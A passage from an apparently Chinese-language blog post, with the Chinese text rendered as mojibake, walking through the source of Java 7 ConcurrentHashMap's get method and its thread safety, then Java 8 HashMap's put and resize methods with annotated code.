çš„èŠ‚ç‚¹éœ€è¦å…‹éš†</strong>ã€‚</p><h3><span id="get-è¿‡ç¨‹åˆ†æ">get è¿‡ç¨‹åˆ†æ</span></h3><p>ç›¸å¯¹äº put æ¥è¯´ï¼Œget çœŸçš„ä¸è¦å¤ªç®€å•ã€‚</p><ol><li>è®¡ç®— hash å€¼ï¼Œæ‰¾åˆ° segment æ•°ç»„ä¸­çš„å…·ä½“ä½ç½®ï¼Œæˆ–æˆ‘ä»¬å‰é¢ç”¨çš„â€œæ§½â€</li><li>æ§½ä¸­ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ ¹æ® hash æ‰¾åˆ°æ•°ç»„ä¸­å…·ä½“çš„ä½ç½®</li><li>åˆ°è¿™é‡Œæ˜¯é“¾è¡¨äº†ï¼Œé¡ºç€é“¾è¡¨è¿›è¡ŒæŸ¥æ‰¾å³å¯</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    Segment&lt;K,V&gt; s; <span class="comment">// manually integrate access methods to reduce overhead</span></span><br><span class="line">    HashEntry&lt;K,V&gt;[] tab;</span><br><span class="line">    <span class="comment">// 1. hash å€¼</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="type">long</span> <span class="variable">u</span> <span class="operator">=</span> (((h &gt;&gt;&gt; segmentShift) &amp; segmentMask) &lt;&lt; SSHIFT) + SBASE;</span><br><span class="line">    <span class="comment">// 2. æ ¹æ® hash æ‰¾åˆ°å¯¹åº”çš„ segment</span></span><br><span class="line">    <span class="keyword">if</span> ((s = (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(segments, u)) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">        (tab = s.table) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 3. æ‰¾åˆ°segment å†…éƒ¨æ•°ç»„ç›¸åº”ä½ç½®çš„é“¾è¡¨ï¼Œéå†</span></span><br><span class="line">        <span class="keyword">for</span> (HashEntry&lt;K,V&gt; e = (HashEntry&lt;K,V&gt;) UNSAFE.getObjectVolatile</span><br><span class="line">                 (tab, ((<span class="type">long</span>)(((tab.length - <span class="number">1</span>) &amp; h)) &lt;&lt; TSHIFT) + TBASE);</span><br><span class="line">             e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">            K k;</span><br><span class="line">            <span class="keyword">if</span> ((k = e.key) == key || (e.hash == h &amp;&amp; key.equals(k)))</span><br><span class="line">                <span class="keyword">return</span> e.value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="å¹¶å‘é—®é¢˜åˆ†æ">å¹¶å‘é—®é¢˜åˆ†æ</span></h3><p>ç°åœ¨æˆ‘ä»¬å·²ç»è¯´å®Œäº† put è¿‡ç¨‹å’Œ get è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° get è¿‡ç¨‹ä¸­æ˜¯æ²¡æœ‰åŠ é”çš„ï¼Œé‚£è‡ªç„¶æˆ‘ä»¬å°±éœ€è¦å»è€ƒè™‘å¹¶å‘é—®é¢˜ã€‚</p><p>æ·»åŠ èŠ‚ç‚¹çš„æ“ä½œ put å’Œåˆ é™¤èŠ‚ç‚¹çš„æ“ä½œ remove éƒ½æ˜¯è¦åŠ  segment ä¸Šçš„ç‹¬å é”çš„ï¼Œæ‰€ä»¥å®ƒä»¬ä¹‹é—´è‡ªç„¶ä¸ä¼šæœ‰é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘çš„é—®é¢˜å°±æ˜¯ get çš„æ—¶å€™åœ¨åŒä¸€ä¸ª segment ä¸­å‘ç”Ÿäº† put æˆ– remove æ“ä½œã€‚</p><ol><li><p>put æ“ä½œçš„çº¿ç¨‹å®‰å…¨æ€§ã€‚</p><ol><li>åˆå§‹åŒ–æ§½ï¼Œè¿™ä¸ªæˆ‘ä»¬ä¹‹å‰å°±è¯´è¿‡äº†ï¼Œä½¿ç”¨äº† CAS æ¥åˆå§‹åŒ– Segment ä¸­çš„æ•°ç»„ã€‚</li><li>æ·»åŠ èŠ‚ç‚¹åˆ°é“¾è¡¨çš„æ“ä½œæ˜¯æ’å…¥åˆ°è¡¨å¤´çš„ï¼Œæ‰€ä»¥ï¼Œå¦‚æœè¿™ä¸ªæ—¶å€™ get æ“ä½œåœ¨é“¾è¡¨éå†çš„è¿‡ç¨‹å·²ç»åˆ°äº†ä¸­é—´ï¼Œæ˜¯ä¸ä¼šå½±å“çš„ã€‚å½“ç„¶ï¼Œå¦ä¸€ä¸ªå¹¶å‘é—®é¢˜å°±æ˜¯ get æ“ä½œåœ¨ put ä¹‹åï¼Œéœ€è¦ä¿è¯åˆšåˆšæ’å…¥è¡¨å¤´çš„èŠ‚ç‚¹è¢«è¯»å–ï¼Œè¿™ä¸ªä¾èµ–äº setEntryAt æ–¹æ³•ä¸­ä½¿ç”¨çš„ UNSAFE.putOrderedObjectã€‚</li><li>æ‰©å®¹ã€‚æ‰©å®¹æ˜¯æ–°åˆ›å»ºäº†æ•°ç»„ï¼Œç„¶åè¿›è¡Œè¿ç§»æ•°æ®ï¼Œæœ€åé¢å°† newTable è®¾ç½®ç»™å±æ€§ tableã€‚æ‰€ä»¥ï¼Œå¦‚æœ get æ“ä½œæ­¤æ—¶ä¹Ÿåœ¨è¿›è¡Œï¼Œé‚£ä¹ˆä¹Ÿæ²¡å…³ç³»ï¼Œå¦‚æœ get å…ˆè¡Œï¼Œé‚£ä¹ˆå°±æ˜¯åœ¨æ—§çš„ table ä¸ŠåšæŸ¥è¯¢æ“ä½œï¼›è€Œ put å…ˆè¡Œï¼Œé‚£ä¹ˆ put æ“ä½œçš„å¯è§æ€§ä¿è¯å°±æ˜¯ table ä½¿ç”¨äº† volatile å…³é”®å­—ã€‚</li></ol></li><li><p>remove æ“ä½œçš„çº¿ç¨‹å®‰å…¨æ€§ã€‚</p><p>remove æ“ä½œæˆ‘ä»¬æ²¡æœ‰åˆ†ææºç ï¼Œæ‰€ä»¥è¿™é‡Œè¯´çš„è¯»è€…æ„Ÿå…´è¶£çš„è¯è¿˜æ˜¯éœ€è¦åˆ°æºç ä¸­å»æ±‚å®ä¸€ä¸‹çš„ã€‚</p><p>get æ“ä½œéœ€è¦éå†é“¾è¡¨ï¼Œä½†æ˜¯ remove æ“ä½œä¼šâ€ç ´åâ€é“¾è¡¨ã€‚</p><p>å¦‚æœ remove ç ´åçš„èŠ‚ç‚¹ get æ“ä½œå·²ç»è¿‡å»äº†ï¼Œé‚£ä¹ˆè¿™é‡Œä¸å­˜åœ¨ä»»ä½•é—®é¢˜ã€‚</p><p>å¦‚æœ remove å…ˆç ´åäº†ä¸€ä¸ªèŠ‚ç‚¹ï¼Œåˆ†ä¸¤ç§æƒ…å†µè€ƒè™‘ã€‚  1ã€å¦‚æœæ­¤èŠ‚ç‚¹æ˜¯å¤´ç»“ç‚¹ï¼Œé‚£ä¹ˆéœ€è¦å°†å¤´ç»“ç‚¹çš„ next è®¾ç½®ä¸ºæ•°ç»„è¯¥ä½ç½®çš„å…ƒç´ ï¼Œtable è™½ç„¶ä½¿ç”¨äº† volatile ä¿®é¥°ï¼Œä½†æ˜¯ volatile å¹¶ä¸èƒ½æä¾›æ•°ç»„å†…éƒ¨æ“ä½œçš„å¯è§æ€§ä¿è¯ï¼Œæ‰€ä»¥æºç ä¸­ä½¿ç”¨äº† UNSAFE æ¥æ“ä½œæ•°ç»„ï¼Œè¯·çœ‹æ–¹æ³• setEntryAtã€‚2ã€å¦‚æœè¦åˆ é™¤çš„èŠ‚ç‚¹ä¸æ˜¯å¤´ç»“ç‚¹ï¼Œå®ƒä¼šå°†è¦åˆ é™¤èŠ‚ç‚¹çš„åç»§èŠ‚ç‚¹æ¥åˆ°å‰é©±èŠ‚ç‚¹ä¸­ï¼Œè¿™é‡Œçš„å¹¶å‘ä¿è¯å°±æ˜¯ next å±æ€§æ˜¯ volatile çš„ã€‚</p></li></ol><h2><span id="java8-hashmap">Java8 HashMap</span></h2><p>Java8 å¯¹ HashMap è¿›è¡Œäº†ä¸€äº›ä¿®æ”¹ï¼Œæœ€å¤§çš„ä¸åŒå°±æ˜¯åˆ©ç”¨äº†çº¢é»‘æ ‘ï¼Œæ‰€ä»¥å…¶ç”± <strong>æ•°ç»„+é“¾è¡¨+çº¢é»‘æ ‘</strong> ç»„æˆã€‚</p><p>æ ¹æ® Java7 HashMap çš„ä»‹ç»ï¼Œæˆ‘ä»¬çŸ¥é“ï¼ŒæŸ¥æ‰¾çš„æ—¶å€™ï¼Œæ ¹æ® hash å€¼æˆ‘ä»¬èƒ½å¤Ÿå¿«é€Ÿå®šä½åˆ°æ•°ç»„çš„å…·ä½“ä¸‹æ ‡ï¼Œä½†æ˜¯ä¹‹åçš„è¯ï¼Œéœ€è¦é¡ºç€é“¾è¡¨ä¸€ä¸ªä¸ªæ¯”è¾ƒä¸‹å»æ‰èƒ½æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„ï¼Œæ—¶é—´å¤æ‚åº¦å–å†³äºé“¾è¡¨çš„é•¿åº¦ï¼Œä¸º **O(n)**ã€‚</p><p>ä¸ºäº†é™ä½è¿™éƒ¨åˆ†çš„å¼€é”€ï¼Œåœ¨ Java8 ä¸­ï¼Œå½“é“¾è¡¨ä¸­çš„å…ƒç´ è¾¾åˆ°äº† 8 ä¸ªæ—¶ï¼Œä¼šå°†é“¾è¡¨è½¬æ¢ä¸ºçº¢é»‘æ ‘ï¼Œåœ¨è¿™äº›ä½ç½®è¿›è¡ŒæŸ¥æ‰¾çš„æ—¶å€™å¯ä»¥é™ä½æ—¶é—´å¤æ‚åº¦ä¸º **O(logN)**ã€‚</p><p>æ¥ä¸€å¼ å›¾ç®€å•ç¤ºæ„ä¸€ä¸‹å§ï¼š</p><p><img src="https://www.javadoop.com/blogimages/map/2.png" alt="2"></p><blockquote><p>æ³¨æ„ï¼Œä¸Šå›¾æ˜¯ç¤ºæ„å›¾ï¼Œä¸»è¦æ˜¯æè¿°ç»“æ„ï¼Œä¸ä¼šè¾¾åˆ°è¿™ä¸ªçŠ¶æ€çš„ï¼Œå› ä¸ºè¿™ä¹ˆå¤šæ•°æ®çš„æ—¶å€™æ—©å°±æ‰©å®¹äº†ã€‚</p></blockquote><p>ä¸‹é¢ï¼Œæˆ‘ä»¬è¿˜æ˜¯ç”¨ä»£ç æ¥ä»‹ç»å§ï¼Œä¸ªäººæ„Ÿè§‰ï¼ŒJava8 çš„æºç å¯è¯»æ€§è¦å·®ä¸€äº›ï¼Œä¸è¿‡ç²¾ç®€ä¸€äº›ã€‚</p><p>Java7 ä¸­ä½¿ç”¨ Entry æ¥ä»£è¡¨æ¯ä¸ª HashMap ä¸­çš„æ•°æ®èŠ‚ç‚¹ï¼ŒJava8 ä¸­ä½¿ç”¨ <strong>Node</strong>ï¼ŒåŸºæœ¬æ²¡æœ‰åŒºåˆ«ï¼Œéƒ½æ˜¯ keyï¼Œvalueï¼Œhash å’Œ next è¿™å››ä¸ªå±æ€§ï¼Œä¸è¿‡ï¼ŒNode åªèƒ½ç”¨äºé“¾è¡¨çš„æƒ…å†µï¼Œçº¢é»‘æ ‘çš„æƒ…å†µéœ€è¦ä½¿ç”¨ <strong>TreeNode</strong>ã€‚</p><p>æˆ‘ä»¬æ ¹æ®æ•°ç»„å…ƒç´ ä¸­ï¼Œç¬¬ä¸€ä¸ªèŠ‚ç‚¹æ•°æ®ç±»å‹æ˜¯ Node è¿˜æ˜¯ TreeNode æ¥åˆ¤æ–­è¯¥ä½ç½®ä¸‹æ˜¯é“¾è¡¨è¿˜æ˜¯çº¢é»‘æ ‘çš„ã€‚</p><h3><span id="put-è¿‡ç¨‹åˆ†æ">put è¿‡ç¨‹åˆ†æ</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬å››ä¸ªå‚æ•° onlyIfAbsent å¦‚æœæ˜¯ trueï¼Œé‚£ä¹ˆåªæœ‰åœ¨ä¸å­˜åœ¨è¯¥ key æ—¶æ‰ä¼šè¿›è¡Œ put æ“ä½œ</span></span><br><span class="line"><span class="comment">// ç¬¬äº”ä¸ªå‚æ•° evict æˆ‘ä»¬è¿™é‡Œä¸å…³å¿ƒ</span></span><br><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">boolean</span> onlyIfAbsent,</span></span><br><span class="line"><span class="params">               <span class="type">boolean</span> evict)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="type">int</span> n, i;</span><br><span class="line">    <span class="comment">// ç¬¬ä¸€æ¬¡ put å€¼çš„æ—¶å€™ï¼Œä¼šè§¦å‘ä¸‹é¢çš„ resize()ï¼Œç±»ä¼¼ java7 çš„ç¬¬ä¸€æ¬¡ put ä¹Ÿè¦åˆå§‹åŒ–æ•°ç»„é•¿åº¦</span></span><br><span class="line">    <span class="comment">// ç¬¬ä¸€æ¬¡ resize å’Œåç»­çš„æ‰©å®¹æœ‰äº›ä¸ä¸€æ ·ï¼Œå› ä¸ºè¿™æ¬¡æ˜¯æ•°ç»„ä» null åˆå§‹åŒ–åˆ°é»˜è®¤çš„ 16 æˆ–è‡ªå®šä¹‰çš„åˆå§‹å®¹é‡</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    <span class="comment">// æ‰¾åˆ°å…·ä½“çš„æ•°ç»„ä¸‹æ ‡ï¼Œå¦‚æœæ­¤ä½ç½®æ²¡æœ‰å€¼ï¼Œé‚£ä¹ˆç›´æ¥åˆå§‹åŒ–ä¸€ä¸‹ Node å¹¶æ”¾ç½®åœ¨è¿™ä¸ªä½ç½®å°±å¯ä»¥äº†</span></span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="literal">null</span>)</span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">// æ•°ç»„è¯¥ä½ç½®æœ‰æ•°æ®</span></span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="comment">// é¦–å…ˆï¼Œåˆ¤æ–­è¯¥ä½ç½®çš„ç¬¬ä¸€ä¸ªæ•°æ®å’Œæˆ‘ä»¬è¦æ’å…¥çš„æ•°æ®ï¼Œkey æ˜¯ä¸æ˜¯&quot;ç›¸ç­‰&quot;ï¼Œå¦‚æœæ˜¯ï¼Œå–å‡ºè¿™ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            e = p;</span><br><span class="line">        <span class="comment">// å¦‚æœè¯¥èŠ‚ç‚¹æ˜¯ä»£è¡¨çº¢é»‘æ ‘çš„èŠ‚ç‚¹ï¼Œè°ƒç”¨çº¢é»‘æ ‘çš„æ’å€¼æ–¹æ³•ï¼Œæœ¬æ–‡ä¸å±•å¼€è¯´çº¢é»‘æ ‘</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="built_in">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// åˆ°è¿™é‡Œï¼Œè¯´æ˜æ•°ç»„è¯¥ä½ç½®ä¸Šæ˜¯ä¸€ä¸ªé“¾è¡¨</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="comment">// æ’å…¥åˆ°é“¾è¡¨çš„æœ€åé¢(Java7 æ˜¯æ’å…¥åˆ°é“¾è¡¨çš„æœ€å‰é¢)</span></span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">                    <span class="comment">// TREEIFY_THRESHOLD ä¸º 8ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæ–°æ’å…¥çš„å€¼æ˜¯é“¾è¡¨ä¸­çš„ç¬¬ 8 ä¸ª</span></span><br><span class="line">                    <span class="comment">// ä¼šè§¦å‘ä¸‹é¢çš„ treeifyBinï¼Œä¹Ÿå°±æ˜¯å°†é“¾è¡¨è½¬æ¢ä¸ºçº¢é»‘æ ‘</span></span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å¦‚æœåœ¨è¯¥é“¾è¡¨ä¸­æ‰¾åˆ°äº†&quot;ç›¸ç­‰&quot;çš„ key(== æˆ– equals)</span></span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="comment">// æ­¤æ—¶ breakï¼Œé‚£ä¹ˆ e ä¸ºé“¾è¡¨ä¸­[ä¸è¦æ’å…¥çš„æ–°å€¼çš„ key &quot;ç›¸ç­‰&quot;]çš„ node</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// e!=null è¯´æ˜å­˜åœ¨æ—§å€¼çš„keyä¸è¦æ’å…¥çš„key&quot;ç›¸ç­‰&quot;</span></span><br><span class="line">        <span class="comment">// å¯¹äºæˆ‘ä»¬åˆ†æçš„putæ“ä½œï¼Œä¸‹é¢è¿™ä¸ª if å…¶å®å°±æ˜¯è¿›è¡Œ &quot;å€¼è¦†ç›–&quot;ï¼Œç„¶åè¿”å›æ—§å€¼</span></span><br><span class="line">        <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="literal">null</span>)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="comment">// å¦‚æœ HashMap ç”±äºæ–°æ’å…¥è¿™ä¸ªå€¼å¯¼è‡´ size å·²ç»è¶…è¿‡äº†é˜ˆå€¼ï¼Œéœ€è¦è¿›è¡Œæ‰©å®¹</span></span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œ Java7 ç¨å¾®æœ‰ç‚¹ä¸ä¸€æ ·çš„åœ°æ–¹å°±æ˜¯ï¼ŒJava7 æ˜¯å…ˆæ‰©å®¹åæ’å…¥æ–°å€¼çš„ï¼ŒJava8 å…ˆæ’å€¼å†æ‰©å®¹ï¼Œä¸è¿‡è¿™ä¸ªä¸é‡è¦ã€‚</p><h4><span id="æ•°ç»„æ‰©å®¹">æ•°ç»„æ‰©å®¹</span></h4><p>resize() æ–¹æ³•ç”¨äº<strong>åˆå§‹åŒ–æ•°ç»„</strong>æˆ–<strong>æ•°ç»„æ‰©å®¹</strong>ï¼Œæ¯æ¬¡æ‰©å®¹åï¼Œå®¹é‡ä¸ºåŸæ¥çš„ 2 å€ï¼Œå¹¶è¿›è¡Œæ•°æ®è¿ç§»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] oldTab = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldCap</span> <span class="operator">=</span> (oldTab == <span class="literal">null</span>) ? <span class="number">0</span> : oldTab.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldThr</span> <span class="operator">=</span> threshold;</span><br><span class="line">    <span class="type">int</span> newCap, newThr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (oldCap &gt; <span class="number">0</span>) &#123; <span class="comment">// å¯¹åº”æ•°ç»„æ‰©å®¹</span></span><br><span class="line">        <span class="keyword">if</span> (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class="line">            threshold = Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">return</span> oldTab;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å°†æ•°ç»„å¤§å°æ‰©å¤§ä¸€å€</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((newCap = oldCap &lt;&lt; <span class="number">1</span>) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class="line">                 oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class="line">            <span class="comment">// å°†é˜ˆå€¼æ‰©å¤§ä¸€å€</span></span><br><span class="line">            newThr = oldThr &lt;&lt; <span class="number">1</span>; <span class="comment">// double threshold</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (oldThr &gt; <span class="number">0</span>) <span class="comment">// å¯¹åº”ä½¿ç”¨ new HashMap(int initialCapacity) åˆå§‹åŒ–åï¼Œç¬¬ä¸€æ¬¡ put çš„æ—¶å€™</span></span><br><span class="line">        newCap = oldThr;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">// å¯¹åº”ä½¿ç”¨ new HashMap() åˆå§‹åŒ–åï¼Œç¬¬ä¸€æ¬¡ put çš„æ—¶å€™</span></span><br><span class="line">        newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class="line">        newThr = (<span class="type">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (newThr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)newCap * loadFactor;</span><br><span class="line">        newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (<span class="type">float</span>)MAXIMUM_CAPACITY ?</span><br><span class="line">                  (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">    threshold = newThr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç”¨æ–°çš„æ•°ç»„å¤§å°åˆå§‹åŒ–æ–°çš„æ•°ç»„</span></span><br><span class="line">    Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[newCap];</span><br><span class="line">    table = newTab; <span class="comment">// å¦‚æœæ˜¯åˆå§‹åŒ–æ•°ç»„ï¼Œåˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œè¿”å› newTab å³å¯</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (oldTab != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// å¼€å§‹éå†åŸæ•°ç»„ï¼Œè¿›è¡Œæ•°æ®è¿ç§»ã€‚</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">            Node&lt;K,V&gt; e;</span><br><span class="line">            <span class="keyword">if</span> ((e = oldTab[j]) != <span class="literal">null</span>) &#123;</span><br><span class="line">                oldTab[j] = <span class="literal">null</span>;</span><br><span class="line">                <span class="comment">// å¦‚æœè¯¥æ•°ç»„ä½ç½®ä¸Šåªæœ‰å•ä¸ªå…ƒç´ ï¼Œé‚£å°±ç®€å•äº†ï¼Œç®€å•è¿ç§»è¿™ä¸ªå…ƒç´ å°±å¯ä»¥äº†</span></span><br><span class="line">                <span class="keyword">if</span> (e.next == <span class="literal">null</span>)</span><br><span class="line">                    newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;</span><br><span class="line">                <span class="comment">// å¦‚æœæ˜¯çº¢é»‘æ ‘ï¼Œå…·ä½“æˆ‘ä»¬å°±ä¸å±•å¼€äº†</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                    ((TreeNode&lt;K,V&gt;)e).split(<span class="built_in">this</span>, newTab, j, oldCap);</span><br><span class="line">                <span class="keyword">else</span> &#123; </span><br><span class="line">                    <span class="comment">// è¿™å—æ˜¯å¤„ç†é“¾è¡¨çš„æƒ…å†µï¼Œ</span></span><br><span class="line">                    <span 